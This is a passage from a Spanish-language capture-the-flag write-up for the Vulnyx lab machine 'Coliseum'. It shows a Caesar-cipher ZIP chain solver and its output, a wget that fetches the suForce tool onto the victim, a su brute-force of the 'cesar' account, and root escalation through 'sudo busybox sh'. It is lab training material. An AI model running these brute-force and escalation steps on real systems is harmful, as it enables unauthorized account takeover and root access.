    with open(wordlist_path, "w", encoding="utf-8") as f:
        for pw in used_passwords:
            f.write(pw + "\n")

    print("=== Cadena completada (o último nivel alcanzado) ===")
    print(f"Niveles resueltos : {len(used_passwords)}")
    print(f"Wordlist guardada : {wordlist_path}")


    # 6) Mostrar contenido del último pista.txt
    if last_note_path and os.path.exists(last_note_path):
        print("\n=== Contenido del último pista.txt ===\n")
        try:
            with open(last_note_path, "r", encoding="utf-8", errors="ignore") as f:
                print(f.read())
        except Exception as e:
            print(f"[!] No se pudo leer el último pista.txt: {e}")
    else:
        print("\n[!] No se encontró el último pista.txt para mostrar su contenido.")


if __name__ == "__main__":
    main()

```

Ejecutamos el script y obtenemos la pista final:

```bash
┌──(kali㉿kali)-[~/CTFs/Vulnyx/Coliseum]
└─$ python3 ./solve_cesar_chain_unzip.py 
[+] Empezando cadena desde: cesar_I.zip
[+] Usando pista inicial  : initial_hint.txt

[+] Resolviendo nivel 1 → cesar_I.zip
    - Contraseña encontrada: 'hdz8k4u38c' (shift 13)
[+] Resolviendo nivel 2 → cesar_II.zip
    - Contraseña encontrada: '5op4633g9e' (shift 7)
[+] Resolviendo nivel 3 → cesar_III.zip
    - Contraseña encontrada: 'k7mt1gzj8c' (shift 14)
[+] Resolviendo nivel 4 → cesar_IV.zip
...
...
...
[+] Resolviendo nivel 199 → cesar_CXCIX.zip
    - Contraseña encontrada: 'osw0h20m1o' (shift 18)
[+] Resolviendo nivel 200 → cesar_CC.zip
    - Contraseña encontrada: 'us89w37de4' (shift 25)

[+] No se ha encontrado más KEY_FOR_CAESAR o ningún ZIP interno.
    Probablemente este sea el último nivel.

=== Cadena completada (o último nivel alcanzado) ===
Niveles resueltos : 200
Wordlist guardada : /home/kali/CTFs/Vulnyx/Coliseum/wordlist_from_chain.txt

=== Contenido del último pista.txt ===

You have reached the final chamber of the Coliseum (Level CC).

Every key you used to open these sealed scrolls was valid for its own gate.
But here, on this system, there is a gladiator account named 'cesar'.

Exactly ONE of the keys you have used along the way is also the password
for that 'cesar' account.

Gather all of your keys into a single wordlist and try them against
the 'cesar' user.

```

Tal y como se indica en el mensaje final, una de las contraseñas utilizadas para abrir los distintos archivos zip es también la del usuario `cesar`. Aunque ya tenemos acceso a una consola como este usuario e incluso acceso SSH, desconocemos su contraseña real.

Por ello, es imprescindible contar con un diccionario que contenga todas las contraseñas descifradas durante el proceso. Si tu script no guarda automáticamente todas las passwords en un fichero tras sacar la última pista, deberías modificarlo para que lo haga (por ejemplo, generando un archivo `wordlist_from_chain.txt` con todas ellas recopiladas).



### Fuerza bruta para obtener la contraseña de cesar

Cuando ya dispones de la wordlist generada (por ejemplo, `wordlist_from_chain.txt`), solo tienes que transferirla a la máquina víctima y utilizar la herramienta `suForce` para realizar la fuerza bruta sobre el usuario `cesar` y averiguar su contraseña real. Recuerda que `suForce` es una utilidad desarrollada por `d4t4s3c`, el creador de la plataforma de la máquina. 

```bash
scp -i ~/.ssh/id_ed25519 /home/kali/CTFs/Vulnyx/Coliseum/wordlist_from_chain.txt cesar@192.168.1.113:~
```

Para realizar la fuerza bruta sobre la cuenta `cesar`, se recomienda usar `suForce`. Si la máquina víctima no tiene acceso a internet, descárgalo en tu máquina atacante y transfierelo igual que la wordlist.

En la víctima:

```bash
cesar@coliseum:~$ wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/suForce/refs/heads/main/suForce"
cesar@coliseum:~$ chmod +x suForce
cesar@coliseum:~$ ./suForce -u cesar -w wordlist_from_chain.txt 
            _____                          
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
───────────────────────────────────
 code: d4t4s3c     version: v1.0.0
───────────────────────────────────
🎯 Username | cesar
📖 Wordlist | wordlist_from_chain.txt
🔎 Status   | 175/200/87%/XXXXXXXX
💥 Password | XXXXXXXX
───────────────────────────────────
```

Cuando aparezca el campo `💥 Password`, habrás encontrado la contraseña válida de `cesar`.

### Privilegios sudo del usuario `cesar` y escalada a root

Una vez descubrimos la contraseña del usuario `cesar`, es fundamental investigar qué acciones privilegiadas puede realizar mediante `sudo`, ya que esto podría permitirnos escalar privilegios hasta root.

Para ver los permisos otorgados a través de `sudo`, ejecuta el siguiente comando:

```bash
cesar@coliseum:~$ sudo -l
[sudo] contraseña para cesar: 
Matching Defaults entries for cesar on coliseum:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User cesar may run the following commands on coliseum:
    (root) /usr/bin/busybox
```

Esto significa que el usuario `cesar` tiene permitido ejecutar `/usr/bin/busybox` como root mediante `sudo`, pero debe proporcionar su propia contraseña para poder hacerlo. `BusyBox` es una utilidad polivalente que agrupa muchas herramientas de Unix bajo un único binario, incluyendo una shell propia.

**Escalada de privilegios usando BusyBox:**

Para obtener una shell como root, simplemente ejecuta:

```bash
sudo busybox sh
```

Esto nos dará una shell con privilegios de administrador (root), sin necesidad de conocer la contraseña de root del sistema.

Una vez en la shell de root, ya puedes acceder a cualquier archivo protegido, incluyendo la flag final:

```bash
cat /root/root.txt
```

De este modo, completamos el escalado de privilegios y resolvemos la máquina aprovechando la configuración de sudo hacia BusyBox. 

Con esto concluye el análisis de la máquina **Coliseum** de Vulnyx. Espero que tanto las explicaciones como los scripts proporcionados hayan resultado útiles y claros.

¡Nos vemos en el próximo reto!

